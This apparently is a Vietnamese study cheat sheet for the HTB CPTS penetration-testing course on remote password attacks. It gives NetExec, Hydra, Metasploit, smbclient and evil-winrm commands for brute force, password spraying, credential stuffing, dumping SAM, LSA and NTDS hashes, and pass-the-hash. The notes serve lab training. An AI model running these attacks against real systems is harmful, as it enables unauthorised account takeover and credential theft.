---
title: "Remote Password Attacks"
date: 2026-04-16 00:11:00 +0700
categories: [HTB_CPTS, Credentials]
tags: [brute-force, password-spray, netexec, hydra, smb, winrm, rdp, ssh, pass-the-hash, default-credentials]
---

> Tấn công xác thực từ xa qua các giao thức mạng: SMB, WinRM, RDP, SSH, FTP,... Brute-force → Spraying → Credential Stuffing → Pass-the-Hash.
{: .prompt-info}

---

## ⚠️ Cảnh báo Lockout

> **Luôn kiểm tra lockout threshold trước khi spray.**
> - **Brute force** = nhiều password × 1 user → dễ bị lockout
> - **Spraying** = 1 password × nhiều user → tránh lockout policy
> - **Stuffing** = credential từ breach khác → khai thác password reuse
{: .prompt-warning}

---

## NetExec (nxc)

```bash
netexec winrm <ip> -u user.list -p password.list
netexec smb <ip> -u "user" -p "password" --shares
netexec smb <ip> --local-auth -u <username> -p <password> --sam
netexec smb <ip> --local-auth -u <username> -p <password> --lsa
netexec smb <ip> -u <username> -p <password> --ntds
netexec smb <ip> -u <username> -p <password> -M ntdsutil
```

| Option | Giải thích |
|---|---|
| `winrm` / `smb` | Protocol — chọn giao thức tấn công |
| `--shares` | Liệt kê SMB shares có quyền truy cập |
| `--local-auth` | Dùng local account thay vì domain account |
| `--sam` | Dump SAM database (local user hashes) |
| `--lsa` | Dump LSA Secrets — có thể có cleartext creds |
| `--ntds` | Dump NTDS.dit — toàn bộ domain hashes (DC only) |
| `-M ntdsutil` | Tự động toàn bộ pipeline dump → transfer → cleanup |

**`--ntds` vs `-M ntdsutil`:**
- `--ntds` — dump trực tiếp qua API, đơn giản hơn
- `-M ntdsutil` — dùng VSS, output lưu tại `/home/<user>/.nxc/logs/*.ntds`

```bash
# Lọc account đang active
grep -iv disabled /home/bob/.nxc/logs/DC01_*.ntds | cut -d ':' -f1
```

---

## Hydra — Multi-protocol Brute Force

```bash
hydra -L user.list -P password.list <service>://<ip>
hydra -l username -P password.list <service>://<ip>
hydra -L user.list -p password <service>://<ip>
hydra -C <user_pass.list> ssh://<IP>
```

| Option | Giải thích |
|---|---|
| `-L` / `-l` | Chữ HOA = file list · Chữ thường = string đơn |
| `-P` / `-p` | Chữ HOA = file list · Chữ thường = string đơn |
| `-C <file>` | Combo list dạng `user:pass` — credential stuffing |
| `<service>://<ip>` | `ssh`, `ftp`, `rdp`, `smb`, `http-get`,... |

**Khi Hydra lỗi SMBv3 → dùng Metasploit:**

```bash
use auxiliary/scanner/smb/smb_login
set user_file username.list
set pass_file password.list
set rhosts <ip>
run
```

---

## smbclient

```bash
smbclient -L //10.129.42.197 -U user          # Liệt kê shares
smbclient //10.129.42.197/SHARENAME -U user   # Kết nối share

smb: \> ls
smb: \> get <filename>
smb: \> mget *
```

---

## RDP — Remote Desktop

```bash
# Brute force
hydra -L user.list -P password.list -t 4 -W 3 rdp://<ip>

# Kết nối
xfreerdp /v:<ip> /u:<username> /p:<password> /cert:ignore /sec:tls
rdesktop -u <username> -p <password> <ip>
```

> `xfreerdp` mặc định dùng NLA → thêm `/cert:ignore /sec:tls`. `rdesktop` dùng classic RDP security → ít lỗi hơn trên HTB lab.
{: .prompt-info}

---

## Password Spraying & Credential Stuffing

```bash
# Spraying — 1 password × nhiều user
netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'

# Stuffing — combo list user:pass
hydra -C user_pass.list ssh://10.100.38.23
```

---

## Default Credentials

```bash
pip3 install defaultcreds-cheat-sheet
creds search <product>   # linksys, cisco, tomcat,...
```

> **Workflow:** Identify product → `creds search <name>` → `hydra -C list <service>://<ip>`
{: .prompt-tip}

---

## Pass-The-Hash

```bash
evil-winrm -i <ip> -u Administrator -H "<NT_hash>"
```

> **PtH hoạt động thế nào?** NTLM auth không cần plaintext — chỉ cần hash để tính response. Dùng khi crack hash thất bại hoặc cần lateral movement nhanh.
{: .prompt-info}
